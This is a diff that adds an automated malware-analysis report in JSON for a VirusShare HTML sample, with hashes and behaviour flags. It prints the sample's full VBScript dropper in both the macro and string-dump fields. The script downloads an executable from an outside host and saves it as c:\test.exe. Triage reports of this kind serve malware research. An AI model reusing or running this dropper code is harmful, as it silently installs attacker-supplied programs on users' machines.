@@ -1,0 +1,57 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "ADODB.Stream": "May create a text file",
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Microsoft.XMLHTTP": "May download files from the Internet",
+            "SaveToFile": "May create a text file",
+            "Write": "May write to a file",
+            "open": "May open a file"
+        },
+        "macro": "<script language=\"vbscript\">\nconst adTypeBinary = 1\nconst adSaveCreateOverwrite = 2\nconst adModeReadWrite = 3\nset xmlHTTP = CreateObject(\"Microsoft.XMLHTTP\")\nxmlHTTP.open \"GET\",\"http://ip3e83566f.speed.planet.nl/NOTEPAD.EXE\",false\nxmlHTTP.send\ncontents = xmlHTTP.responseBody\nSet oStr = CreateObject(\"ADODB.Stream\")\noStr.Mode = adModeReadWrite\noStr.Type = adTypeBinary\noStr.Open\noStr.Write(contents)\noStr.SaveToFile \"c:\\\\test.exe\", adSaveCreateOverwrite\n</script>"
+    },
+    "filename": "VirusShare_469f6ba052466513d69005919cf34b8d",
+    "filesize": 477,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "469f6ba052466513d69005919cf34b8d",
+        "sha1": "0125d0cf1a14ecf1fb9ad7354d6ab041021d20ee",
+        "sha256": "46144406465e149baa6d22daa954f3a808bf9d1f7b8636a3bf74173ffd67ec7b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<script language=\"vbscript\">",
+            "const adTypeBinary = 1",
+            "const adSaveCreateOverwrite = 2",
+            "const adModeReadWrite = 3",
+            "set xmlHTTP = CreateObject(\"Microsoft.XMLHTTP\")",
+            "xmlHTTP.open \"GET\",\"http://ip3e83566f.speed.planet.nl/NOTEPAD.EXE\",false",
+            "xmlHTTP.send",
+            "contents = xmlHTTP.responseBody",
+            "Set oStr = CreateObject(\"ADODB.Stream\")",
+            "oStr.Mode = adModeReadWrite",
+            "oStr.Type = adTypeBinary",
+            "oStr.Open",
+            "oStr.Write(contents)",
+            "oStr.SaveToFile \"c:\\\\test.exe\", adSaveCreateOverwrite",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://ip3e83566f.speed.planet.nl/NOTEPAD.EXE"
+        ]
+    },
+    "time": "0:00:00.269901",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
